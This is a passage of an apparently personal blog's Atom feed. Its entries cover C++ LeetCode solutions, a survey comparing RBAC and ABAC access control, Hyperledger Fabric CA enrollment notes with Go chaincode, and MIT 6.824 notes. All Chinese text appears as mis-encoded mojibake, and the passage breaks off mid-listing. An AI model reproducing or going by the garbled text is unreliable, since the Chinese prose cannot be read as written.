&lt;p&gt;æ˜¨å¤©ç¬¬ä¸€ä¸ªæ€è·¯æ˜¯ç”¨æ’åºï¼Œæ‰¾å‡ºæœ€å¤§çš„mä¸ªæ•°ï¼Œè¿™mä¸ªæ•°æ°å¥½å°†æ•°ç»„åˆ†æˆkä¸ªéƒ¨åˆ†ï¼Œå‘ç°ä¸å¯è¡Œã€‚&lt;br&gt;ç„¶åæš´åŠ›æœç´¢ï¼Œè¶…æ—¶äº†ï¼Œæš´æœæ—¶è€ƒè™‘æ·»åŠ éš”æ¿ï¼Œå…¶ä¸­left_valueè¡¨ç¤ºå½“å‰æœç´¢ä¸‹æ ‡iä¹‹å‰çš„åˆ†ç»„å¹³å‡å€¼&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>ABAC è°ƒç ”</title>
    <link href="https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/ABAC/"/>
    <id>https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/ABAC/</id>
    <published>2022-11-22T04:15:37.000Z</published>
    <updated>2022-11-24T07:11:39.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯abac-rbac"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯abac-rbac"></a> ä»€ä¹ˆæ˜¯ABACã€RBAC</h2><h3 id="rbac-role-based-access-control"><a class="markdownIt-Anchor" href="#rbac-role-based-access-control"></a> RBAC â€“ role based access control</h3><p>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼Œç³»ç»Ÿæ ¹æ®ç”¨æˆ·çš„è§’è‰²åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å…·æœ‰æƒé™</p><ul><li>åˆ†ç±»<ul><li>Flat RBACï¼šæ¯ä¸ªå‘˜å·¥è‡³å°‘è¢«åˆ†é…ä¸€ä¸ªè§’è‰²ï¼Œä½†æœ‰äº›äººå¯ä»¥æ‹¥æœ‰å¤šä¸ªè§’è‰²ã€‚å¦‚æœæœ‰äººæƒ³è¦è®¿é—®æ–°æ–‡ä»¶/èµ„æºâ€‹â€‹/æœåŠ¡å™¨ï¼Œä»–ä»¬éœ€è¦å…ˆè·å¾—ä¸€ä¸ªæ–°è§’è‰²ã€‚</li><li>åˆ†å±‚ RBACï¼šè§’è‰²æ˜¯æ ¹æ®èµ„å†çº§åˆ«å®šä¹‰çš„ã€‚é™¤äº†è‡ªå·±çš„ç‰¹æƒå¤–ï¼Œé«˜çº§å‘˜å·¥è¿˜æ‹¥æœ‰ä¸‹å±çš„ç‰¹æƒã€‚</li><li>å—çº¦æŸçš„ RBACï¼šè¯¥æ¨¡å‹å¼•å…¥äº†èŒè´£åˆ†ç¦» (SOD)ã€‚SOD å°†æ‰§è¡Œä»»åŠ¡çš„æƒé™åˆ†æ•£åˆ°å¤šä¸ªç”¨æˆ·ï¼Œä»è€Œé™ä½æ¬ºè¯ˆå’Œ/æˆ–é£é™©æ´»åŠ¨çš„é£é™©ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¼€å‘äººå‘˜æƒ³è¦åœç”¨æœåŠ¡å™¨ï¼Œä»–ä»¬ä¸ä»…éœ€è¦ç›´æ¥ç»ç†çš„æ‰¹å‡†ï¼Œè¿˜éœ€è¦åŸºç¡€è®¾æ–½è´Ÿè´£äººçš„æ‰¹å‡†ã€‚è¿™è®©åŸºç¡€è®¾æ–½è´Ÿè´£äººåšå‡ºæ”¹å˜ï¼Œæ‹’ç»æœ‰é£é™©å’Œ/æˆ–ä¸å¿…è¦çš„è¯·æ±‚ã€‚</li><li>å¯¹ç§° RBACï¼šå®šæœŸå®¡æŸ¥æ‰€æœ‰ç»„ç»‡è§’è‰²ã€‚ä½œä¸ºè¿™äº›å®¡æŸ¥çš„ç»“æœï¼Œå¯èƒ½ä¼šåˆ†é…æˆ–æ’¤é”€ç‰¹æƒï¼Œå¯èƒ½ä¼šæ·»åŠ æˆ–åˆ é™¤è§’è‰²ã€‚</li></ul></li></ul><h3 id="abac-attribute-based-access-control"><a class="markdownIt-Anchor" href="#abac-attribute-based-access-control"></a> ABAC â€“ attribute based access control</h3><p>åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼Œç³»ç»Ÿæ ¹æ®ç”¨æˆ·çš„å±æ€§åˆ¤æ–­æƒé™ï¼Œå±æ€§å¯èƒ½ä¸ç”¨æˆ·ã€è®¿é—®çš„èµ„æºã€è¡Œä¸ºå’Œç¯å¢ƒç­‰å› ç´ ç›¸å…³</p><h2 id="ä¼˜ç¼ºç‚¹"><a class="markdownIt-Anchor" href="#ä¼˜ç¼ºç‚¹"></a> ä¼˜ç¼ºç‚¹</h2><h3 id="rbac"><a class="markdownIt-Anchor" href="#rbac"></a> RBAC</h3><ul><li>ä¼˜ç‚¹<ul><li>ç®€æ˜“ï¼šå®šä¹‰è§’è‰²æ¯”åˆ†é…è§’è‰²æ›´å®¹æ˜“</li><li>å±‚çº§ï¼šæ›´å®¹æ˜“å®šä¹‰å±‚æ¬¡ç»“æ„ï¼Œä¸Šçº§æ‹¥æœ‰ä¸‹çº§çš„æƒé™</li><li>æˆæœ¬ï¼šè§’è‰²è¾ƒå°‘æ—¶ï¼Œå®æ–½æˆæœ¬ä½</li></ul></li><li>ç¼ºç‚¹<ul><li>è§’è‰²çˆ†ç‚¸ï¼šå®¹æ˜“è§’è‰²çˆ†ç‚¸ï¼Œå¯¼è‡´è¦æ·»åŠ æ›´å¤šè§’è‰²æ»¡è¶³éœ€æ±‚ã€‚åœ¨è§’è‰²çˆ†ç‚¸çš„æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·éœ€æ±‚è½¬æ¢ä¸ºè§’è‰²å¯èƒ½æ˜¯ä¸€é¡¹å¤æ‚çš„ä»»åŠ¡</li></ul></li></ul><h3 id="abac"><a class="markdownIt-Anchor" href="#abac"></a> ABAC</h3><ul><li>ä¼˜ç‚¹<ul><li>ç»†ç²’åº¦ï¼šå¯ä»¥å®šä¹‰æ›´åŠ ç²¾ç»†çš„æ§åˆ¶ç­–ç•¥ï¼Œä»å¤§é‡çš„å±æ€§ä¸­è¿›è¡Œé€‰æ‹©</li><li>å¯æ‰©å±•æ€§ï¼šæ— éœ€ä¿®æ”¹ç°æœ‰è§„åˆ™ä»¥é€‚åº”æ–°ç”¨æˆ·ã€‚ç®¡ç†å‘˜éœ€è¦åšçš„å°±æ˜¯ä¸ºæ–°åŠ å…¥è€…åˆ†é…ç›¸å…³å±æ€§ã€‚</li><li>æ˜“äºç»´æŠ¤ï¼šé€šè¿‡ä¿®æ”¹å±æ€§è€Œä¸æ˜¯å®šä¹‰æ–°è§’è‰²ä¿®æ”¹ç”¨æˆ·æƒé™</li></ul></li><li>ç¼ºç‚¹<ul><li>èµ„æºï¼šæ¯”RBACæ›´è€—æ—¶ï¼Œæ›´å¤šèµ„æºï¼Œç»æµæˆæœ¬æ›´é«˜</li></ul></li></ul><h2 id="é€‚ç”¨èŒƒå›´"><a class="markdownIt-Anchor" href="#é€‚ç”¨èŒƒå›´"></a> é€‚ç”¨èŒƒå›´</h2><h3 id="abac-2"><a class="markdownIt-Anchor" href="#abac-2"></a> ABAC</h3><ul><li>å¤§å‹ç»„ç»‡ï¼Œæ”¯æŒå¯æ‰©å±•æ€§</li><li>éœ€è¦æ ¹æ®ç¯å¢ƒï¼Œå¦‚åœ°ç†ä½ç½®ï¼Œæ—¶é—´ç­‰å› ç´ åˆ¤æ–­æƒé™</li><li>æƒ³è¦å°½å¯èƒ½ç²¾ç»†å’Œçµæ´»çš„è®¿é—®æ§åˆ¶ç­–ç•¥</li><li>æœ‰æ—¶é—´ã€èµ„æºå’Œé¢„ç®—æ¥æ­£ç¡®å®æ–½ ABAC</li></ul><h3 id="rbac-2"><a class="markdownIt-Anchor" href="#rbac-2"></a> RBAC</h3><ul><li>åœ¨ä¸­å°å‹ç»„ç»‡ä¸­</li><li>åœ¨æ‚¨çš„ç»„ç»‡å†…æ‹¥æœ‰å®šä¹‰æ˜ç¡®çš„ç¾¤ä½“ï¼Œå¹¶ä¸”åº”ç”¨å¹¿æ³›çš„ã€åŸºäºè§’è‰²çš„ç­–ç•¥æ˜¯æœ‰æ„ä¹‰çš„</li><li>å®æ–½è®¿é—®æ§åˆ¶ç­–ç•¥çš„æ—¶é—´ã€èµ„æºå’Œ/æˆ–é¢„ç®—æœ‰é™</li><li>ä¸è¦æœ‰å¤ªå¤šçš„å¤–éƒ¨è´¡çŒ®è€…ï¼Œä¹Ÿä¸éœ€è¦åŠ å…¥å¾ˆå¤šæ–°äºº</li></ul><h2 id="fabricä¸­å¯¹abacçš„æ”¯æŒ"><a class="markdownIt-Anchor" href="#fabricä¸­å¯¹abacçš„æ”¯æŒ"></a> fabricä¸­å¯¹abacçš„æ”¯æŒ</h2><ul><li><a href="https://hyperledger-fabric-ca.readthedocs.io/en/latest/users-guide.html#attribute-based-access-control">åœ°å€</a></li><li><a href="https://github.com/hyperledger/fabric-chaincode-go/blob/main/pkg/cid/README.md">abac api</a></li></ul><h2 id="fabricæ•°æ®å¢åˆ æ”¹æŸ¥"><a class="markdownIt-Anchor" href="#fabricæ•°æ®å¢åˆ æ”¹æŸ¥"></a> fabricæ•°æ®å¢åˆ æ”¹æŸ¥</h2><h3 id="åˆ é™¤"><a class="markdownIt-Anchor" href="#åˆ é™¤"></a> åˆ é™¤</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SmartContract)</span></span> DeleteAsset(ctx contractapi.TransactionContextInterface, id <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">asset, err := s.ReadAsset(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clientID, err := s.GetSubmittingClientIdentity(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> clientID != asset.Owner &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;submitting client not authorized to update asset, does not own asset&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx.GetStub().DelState(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ä»€ä¹ˆæ˜¯abac-rbac&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ä»€ä¹ˆæ˜¯abac-rbac&quot;&gt;&lt;/a&gt; ä»€ä¹ˆæ˜¯ABACã€RBAC&lt;/h2&gt;
&lt;h3 id=&quot;rbac-role-based-access-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rbac-role-based-access-control&quot;&gt;&lt;/a&gt; RBAC â€“ role based access control&lt;/h3&gt;
&lt;p&gt;åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼Œç³»ç»Ÿæ ¹æ®ç”¨æˆ·çš„è§’è‰²åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å…·æœ‰æƒé™&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆ†ç±»
&lt;ul&gt;
&lt;li&gt;Flat RBACï¼šæ¯ä¸ªå‘˜å·¥è‡³å°‘è¢«åˆ†é…ä¸€ä¸ªè§’è‰²ï¼Œä½†æœ‰äº›äººå¯ä»¥æ‹¥æœ‰å¤šä¸ªè§’è‰²ã€‚å¦‚æœæœ‰äººæƒ³è¦è®¿é—®æ–°æ–‡ä»¶/èµ„æºâ€‹â€‹/æœåŠ¡å™¨ï¼Œä»–ä»¬éœ€è¦å…ˆè·å¾—ä¸€ä¸ªæ–°è§’è‰²ã€‚&lt;/li&gt;
&lt;li&gt;åˆ†å±‚ RBACï¼šè§’è‰²æ˜¯æ ¹æ®èµ„å†çº§åˆ«å®šä¹‰çš„ã€‚é™¤äº†è‡ªå·±çš„ç‰¹æƒå¤–ï¼Œé«˜çº§å‘˜å·¥è¿˜æ‹¥æœ‰ä¸‹å±çš„ç‰¹æƒã€‚&lt;/li&gt;
&lt;li&gt;å—çº¦æŸçš„ RBACï¼šè¯¥æ¨¡å‹å¼•å…¥äº†èŒè´£åˆ†ç¦» (SOD)ã€‚SOD å°†æ‰§è¡Œä»»åŠ¡çš„æƒé™åˆ†æ•£åˆ°å¤šä¸ªç”¨æˆ·ï¼Œä»è€Œé™ä½æ¬ºè¯ˆå’Œ/æˆ–é£é™©æ´»åŠ¨çš„é£é™©ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¼€å‘äººå‘˜æƒ³è¦åœç”¨æœåŠ¡å™¨ï¼Œä»–ä»¬ä¸ä»…éœ€è¦ç›´æ¥ç»ç†çš„æ‰¹å‡†ï¼Œè¿˜éœ€è¦åŸºç¡€è®¾æ–½è´Ÿè´£äººçš„æ‰¹å‡†ã€‚è¿™è®©åŸºç¡€è®¾æ–½è´Ÿè´£äººåšå‡ºæ”¹å˜ï¼Œæ‹’ç»æœ‰é£é™©å’Œ/æˆ–ä¸å¿…è¦çš„è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;å¯¹ç§° RBACï¼šå®šæœŸå®¡æŸ¥æ‰€æœ‰ç»„ç»‡è§’è‰²ã€‚ä½œä¸ºè¿™äº›å®¡æŸ¥çš„ç»“æœï¼Œå¯èƒ½ä¼šåˆ†é…æˆ–æ’¤é”€ç‰¹æƒï¼Œå¯èƒ½ä¼šæ·»åŠ æˆ–åˆ é™¤è§’è‰²ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;abac-attribute-based-access-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#abac-attribute-based-access-control&quot;&gt;&lt;/a&gt; ABAC â€“ attribute based access control&lt;/h3&gt;
&lt;p&gt;åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼Œç³»ç»Ÿæ ¹æ®ç”¨æˆ·çš„å±æ€§åˆ¤æ–­æƒé™ï¼Œå±æ€§å¯èƒ½ä¸ç”¨æˆ·ã€è®¿é—®çš„èµ„æºã€è¡Œä¸ºå’Œç¯å¢ƒç­‰å› ç´ ç›¸å…³&lt;/p&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="abac" scheme="https://jingtianer.github.io/home/tags/abac/"/>
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>fabric å‡†å…¥è°ƒç ”</title>
    <link href="https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/Fabric%E5%87%86%E5%85%A5/"/>
    <id>https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/Fabric%E5%87%86%E5%85%A5/</id>
    <published>2022-11-22T04:15:37.000Z</published>
    <updated>2022-11-28T01:00:34.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fabric-ca"><a href="#fabric-ca" class="headerlink" title="fabric ca"></a>fabric ca</h2><ul><li><p><a href="https://hyperledger-fabric-ca.readthedocs.io/en/latest/deployguide/cadeploy.html">å®˜æ–¹æ•™ç¨‹</a></p></li><li><p>fabric caæä¾›ä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½</p><ul><li>æ³¨å†Œ, registration of identities, or connects to LDAP as the user registry</li><li>ç­¾å‘æ³¨å†Œè¯ä¹¦, issuance of Enrollment Certificates (ECerts)</li><li>è¯ä¹¦ç»­è®¢å’ŒåŠé”€, certificate renewal and revocation</li></ul></li></ul><p><img src="https://hyperledger-fabric-ca.readthedocs.io/en/latest/_images/fabric-ca.png"></p><h3 id="è´Ÿè½½å¹³è¡¡"><a href="#è´Ÿè½½å¹³è¡¡" class="headerlink" title="è´Ÿè½½å¹³è¡¡"></a>è´Ÿè½½å¹³è¡¡</h3><p>Hyperledger Fabric CA å®¢æˆ·ç«¯æˆ– SDK å¯ä»¥è¿æ¥åˆ° Hyperledger Fabric CA æœåŠ¡å™¨é›†ç¾¤ä¸­çš„æœåŠ¡å™¨ã€‚è¿™åœ¨å›¾è¡¨çš„å³ä¸Šè§’è¿›è¡Œäº†è¯´æ˜ã€‚å®¢æˆ·ç«¯è·¯ç”±åˆ° HA ä»£ç†ç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹å°†æµé‡è´Ÿè½½å¹³è¡¡åˆ°å…¶ä¸­ä¸€ä¸ªç»“æ„æœåŠ¡å™¨é›†ç¾¤æˆå‘˜ã€‚</p><h2 id="useræ³¨å†Œ"><a href="#useræ³¨å†Œ" class="headerlink" title="useræ³¨å†Œ"></a>useræ³¨å†Œ</h2><h3 id="ä½¿ç”¨fabric-gateway"><a href="#ä½¿ç”¨fabric-gateway" class="headerlink" title="ä½¿ç”¨fabric gateway"></a>ä½¿ç”¨fabric gateway</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¯»å–å…¬é’¥ç§é’¥æ–‡ä»¶</span><br><span class="line">åˆ›å»ºIdentity</span><br><span class="line">ä¸ca/peerå»ºç«‹grpcè¿æ¥ï¼Œè·å–fabricç½‘ç»œå’Œcontract</span><br></pre></td></tr></table></figure><h3 id="ä¸ä½¿ç”¨fabric-gateway"><a href="#ä¸ä½¿ç”¨fabric-gateway" class="headerlink" title="ä¸ä½¿ç”¨fabric gateway"></a>ä¸ä½¿ç”¨fabric gateway</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»å–connection-*.jsonçš„ä½ç½®ï¼Œï¼ˆæå‰ç”Ÿæˆçš„ccpå¯¹è±¡ï¼‰</span><br><span class="line">è·å–caï¼Œæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å·²ç»æ³¨å†Œ</span><br><span class="line">è·å–adminIdentity</span><br><span class="line">æ³¨å†Œï¼Œenroll</span><br></pre></td></tr></table></figure><ul><li>ç”¨æˆ·åªéœ€è¦æä¾›è‡ªå·±çš„ID<code>appUser</code>ï¼Œå°±å¯ä»¥ç”Ÿæˆè®¿é—®åŒºå—é“¾çš„èº«ä»½</li><li>å¦‚æœä½¿ç”¨fabric gatewayï¼Œéœ€è¦peerçš„mspå…¬é’¥ç§é’¥å’Œè¯ä¹¦</li><li>å¦‚æœä¸ä½¿ç”¨fabric gatewayï¼Œåˆ™éœ€è¦ç”¨æˆ·ç«¯çŸ¥é“caçš„è®¿é—®è´¦æˆ·å’Œå¯†ç <code>admin:adminpw</code></li><li>é€šè¿‡caå¯ä»¥è·å¾—å¯¹contractçš„ä½¿ç”¨æƒï¼Œä½†æ˜¯å¦‚æœæœ‰å…¶å®ƒä¸šåŠ¡ï¼Œå¦‚æœä¸ç”¨åˆçº¦å®ç°ï¼Œå¯èƒ½éœ€è¦ä¼ ç»Ÿçš„æ³¨å†Œæ–¹å¼ï¼Œå¹¶äºcaçš„èº«ä»½ç»‘å®š</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;fabric-ca&quot;&gt;&lt;a href=&quot;#fabric-ca&quot; class=&quot;headerlink&quot; title=&quot;fabric ca&quot;&gt;&lt;/a&gt;fabric ca&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://hyperledger-fabric-ca.readthedocs.io/en/latest/deployguide/cadeploy.html&quot;&gt;å®˜æ–¹æ•™ç¨‹&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fabric caæä¾›ä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ³¨å†Œ, registration of identities, or connects to LDAP as the user registry&lt;/li&gt;
&lt;li&gt;ç­¾å‘æ³¨å†Œè¯ä¹¦, issuance of Enrollment Certificates (ECerts)&lt;/li&gt;
&lt;li&gt;è¯ä¹¦ç»­è®¢å’ŒåŠé”€, certificate renewal and revocation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hyperledger-fabric-ca.readthedocs.io/en/latest/_images/fabric-ca.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;è´Ÿè½½å¹³è¡¡&quot;&gt;&lt;a href=&quot;#è´Ÿè½½å¹³è¡¡&quot; class=&quot;headerlink&quot; title=&quot;è´Ÿè½½å¹³è¡¡&quot;&gt;&lt;/a&gt;è´Ÿè½½å¹³è¡¡&lt;/h3&gt;&lt;p&gt;Hyperledger Fabric CA å®¢æˆ·ç«¯æˆ– SDK å¯ä»¥è¿æ¥åˆ° Hyperledger Fabric CA æœåŠ¡å™¨é›†ç¾¤ä¸­çš„æœåŠ¡å™¨ã€‚è¿™åœ¨å›¾è¡¨çš„å³ä¸Šè§’è¿›è¡Œäº†è¯´æ˜ã€‚å®¢æˆ·ç«¯è·¯ç”±åˆ° HA ä»£ç†ç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹å°†æµé‡è´Ÿè½½å¹³è¡¡åˆ°å…¶ä¸­ä¸€ä¸ªç»“æ„æœåŠ¡å™¨é›†ç¾¤æˆå‘˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;useræ³¨å†Œ&quot;&gt;&lt;a href=&quot;#useræ³¨å†Œ&quot; class=&quot;headerlink&quot; title=&quot;useræ³¨å†Œ&quot;&gt;&lt;/a&gt;useræ³¨å†Œ&lt;/h2&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="fabric" scheme="https://jingtianer.github.io/home/tags/fabric/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.824-notebook</title>
    <link href="https://jingtianer.github.io/home/2022/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/mit6.824notes/"/>
    <id>https://jingtianer.github.io/home/2022/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/mit6.824notes/</id>
    <published>2022-11-19T10:00:36.000Z</published>
    <updated>2022-11-21T07:11:39.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a><a href="/home/pdf/Mit6.824Notebook.pdf">åœ°å€</a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;åœ°å€&quot;&gt;&lt;a href=&quot;#åœ°å€&quot; class=&quot;headerlink&quot; title=&quot;åœ°å€&quot;&gt;&lt;/a&gt;&lt;a href=&quot;/home/pdf/Mit6.824Notebook.pdf&quot;&gt;åœ°å€&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    <category term="OS" scheme="https://jingtianer.github.io/home/categories/OS/"/>
    
    
    <category term="6.824" scheme="https://jingtianer.github.io/home/tags/6-824/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-19</title>
    <link href="https://jingtianer.github.io/home/2022/11/15/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9319/"/>
    <id>https://jingtianer.github.io/home/2022/11/15/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9319/</id>
    <published>2022-11-15T03:14:34.000Z</published>
    <updated>2022-11-17T04:59:46.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1710-å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°"><a href="#1710-å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°" class="headerlink" title="1710. å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°"></a><a href="https://leetcode.cn/problems/maximum-units-on-a-truck/">1710. å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumUnits</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; boxTypes, <span class="type">int</span> truckSize)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(boxTypes.<span class="built_in">begin</span>(), boxTypes.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt;&amp; x, vector&lt;<span class="type">int</span>&gt;&amp; y)-&gt;<span class="type">bool</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x[<span class="number">1</span>] &gt; y[<span class="number">1</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> n = boxTypes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(truckSize) &#123;</span><br><span class="line">                ret += <span class="built_in">min</span>(truckSize, boxTypes[i][<span class="number">0</span>])*boxTypes[i][<span class="number">1</span>];</span><br><span class="line">                truckSize -= <span class="built_in">min</span>(truckSize, boxTypes[i][<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 50 + 27 + 14 = 91</span></span><br></pre></td></tr></table></figure><blockquote><p>ç®€å•é¢˜ï¼Œæ’ä¸ªåºå°±è¡Œ</p></blockquote><h2 id="775-å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®"><a href="#775-å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®" class="headerlink" title="775. å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®"></a><a href="https://leetcode.cn/problems/global-and-local-inversions/">775. å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isIdealPermutation</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">abs</span>(nums[i] - i) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æœ€å¼€å§‹æƒ³å¤æ‚äº†ï¼Œæƒ³ç”¨å·®åˆ†æ•°ç»„ç»Ÿè®¡ä¸ªæ•°</p></blockquote><h2 id="39-ç»„åˆæ€»å’Œ"><a href="#39-ç»„åˆæ€»å’Œ" class="headerlink" title="39. ç»„åˆæ€»å’Œ"></a><a href="https://leetcode.cn/problems/combination-sum/">39. ç»„åˆæ€»å’Œ</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 